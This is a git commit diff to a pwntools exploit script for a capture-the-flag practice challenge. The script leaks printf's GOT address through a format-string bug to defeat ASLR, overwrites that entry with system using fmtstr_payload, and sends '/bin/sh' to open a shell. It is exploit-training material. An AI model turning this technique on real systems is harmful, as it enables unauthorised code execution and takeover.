5a9e9bff3f6eee9b317ffaa77ea61445325209cb
Bietola <dincio.montesi@gmail.com>
2023-09-25 17:16:56 +0200

    Solve reliable shellcode

--- challenge/ir0nstone/stack/got-overwrite/expl64.py
+++ challenge/ir0nstone/stack/got-overwrite/expl64.py
@@ -7,17 +7,19 @@ libc = elf.libc
 
 # Leak of printf for aslr
 p.sendline(flat(
-    b'%7$p||||',
+    b'%7$s||||',
     elf.got['printf']
 ))
 printf_leak = u64(p.recv(6) + b'\x00\x00')
 libc.address = printf_leak - libc.sym['printf']
+p.clean()
 
 # p.sendline(flat(
 #     elf.got['printf'],
-#     b'x' * (libc.sym['system'] - 8),
+#     f'%{libc.sym["system"] - 8}c'.encode('utf-8'),
 #     b'%6$n'
 # ))
 p.sendline(fmtstr_payload(6, {elf.got['printf']: libc.sym['system']}))
+p.clean()
 p.sendline(b'/bin/sh')
 p.interactive()
